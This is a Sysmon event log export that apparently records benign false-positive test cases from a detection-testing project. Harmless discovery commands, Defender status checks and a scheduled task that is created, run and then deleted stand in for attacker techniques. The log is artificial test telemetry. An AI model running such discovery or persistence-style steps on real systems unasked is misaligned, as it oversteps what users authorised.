_ts,ID,Timestamp,EventData,ClientId
1783861038826,1,2026-07-12T12:56:04.6868339Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:41.518"",
 ""ProcessGuid"": ""{6bc49a7d-8ecd-6a53-bf05-000000009a01}"",
 ""ProcessId"": 6904,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-001'\nWrite-Output \""$rid $fp start\""\nGet-Process | Select-Object -First 5 | Out-Null\nGet-Service | Select-Object -First 5 | Out-Null\n\u0026 'Get-ChildItem' -LiteralPath 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541' | Out-Null\nSelect-String -Path 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-001_benign.txt' -Pattern 'benign' | Out-Null\nWrite-Output \""$rid $fp ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:04.948581Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:41.823"",
 ""ProcessGuid"": ""{6bc49a7d-8ecd-6a53-bf05-000000009a01}"",
 ""ProcessId"": 6904,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yy20qaba.ne1.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:41.823"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.6189299Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.542"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c005-000000009a01}"",
 ""ProcessId"": 5028,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c \""dir \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.6711133Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.609"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c105-000000009a01}"",
 ""ProcessId"": 11668,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c whoami"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.698479Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.635"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c205-000000009a01}"",
 ""ProcessId"": 7312,
 ""Image"": ""C:\\Windows\\System32\\whoami.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""whoami - displays logged on user information"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""whoami.exe"",
 ""CommandLine"": ""whoami"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ece-6a53-c105-000000009a01}"",
 ""ParentProcessId"": ""11668"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c whoami"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.7984136Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.747"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c305-000000009a01}"",
 ""ProcessId"": 6488,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c hostname"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.8270951Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.778"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c405-000000009a01}"",
 ""ProcessId"": 11352,
 ""Image"": ""C:\\Windows\\System32\\HOSTNAME.EXE"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Hostname APP"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""hostname.exe"",
 ""CommandLine"": ""hostname"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ece-6a53-c305-000000009a01}"",
 ""ParentProcessId"": ""6488"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c hostname"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.8817309Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.832"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c505-000000009a01}"",
 ""ProcessId"": 5396,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c \""echo TFM_FP_20260712_145541 FP-002\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.9461244Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.891"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c605-000000009a01}"",
 ""ProcessId"": 9072,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Create /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003 /TR \""cmd.exe /c echo TFM_FP_20260712_145541 FP-003 scheduled task ok \u003e \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-003_scheduled_task_ok.txt\""\"" /SC ONCE /ST 15:00 /F"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:06.0026937Z,"{
 ""RuleName"": ""T1053"",
 ""UtcTime"": ""2026-07-12 12:55:42.964"",
 ""ProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ProcessId"": 1320,
 ""Image"": ""C:\\Windows\\system32\\svchost.exe"",
 ""TargetFilename"": ""C:\\Windows\\System32\\Tasks\\TFM_FP_TFM_FP_20260712_145541_FP-003"",
 ""CreationUtcTime"": ""2026-07-12 12:55:42.964"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:06.0685842Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:43.038"",
 ""ProcessGuid"": ""{6bc49a7d-8ecf-6a53-c705-000000009a01}"",
 ""ProcessId"": 3984,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Run /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:06.1297828Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:43.091"",
 ""ProcessGuid"": ""{6bc49a7d-8ecf-6a53-c805-000000009a01}"",
 ""ProcessId"": 11412,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /c echo TFM_FP_20260712_145541 FP-003 scheduled task ok \u003e C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-003_scheduled_task_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ParentProcessId"": ""1320"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:09.1808582Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:46.742"",
 ""ProcessGuid"": ""{6bc49a7d-8ed2-6a53-ca05-000000009a01}"",
 ""ProcessId"": 8604,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Delete /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003 /F"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:09.503314Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.129"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ProcessId"": 260,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-005'\nGet-Service | Select-Object -First 10 | Out-Null\nsc.exe query | Out-Null\nWrite-Output \""$rid $fp service query ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:09.8859419Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.598"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ProcessId"": 260,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0b00sha1.fyw.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:47.598"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:10.2121387Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.992"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cc05-000000009a01}"",
 ""ProcessId"": 8500,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\sc.exe\"" query"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ParentProcessId"": ""260"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-005'\nGet-Service | Select-Object -First 10 | Out-Null\nsc.exe query | Out-Null\nWrite-Output \""$rid $fp service query ok\""\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:10.3054562Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:48.096"",
 ""ProcessGuid"": ""{6bc49a7d-8ed4-6a53-cd05-000000009a01}"",
 ""ProcessId"": 11756,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-006'\n$mp = Get-Command Get-MpComputerStatus -ErrorAction SilentlyContinue\nif ($null -ne $mp) { Get-MpComputerStatus | Out-Null }\nGet-Process -Name SecurityHealthSystray,MsMpEng -ErrorAction SilentlyContinue | Out-Null\nWrite-Output \""$rid $fp security discovery ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
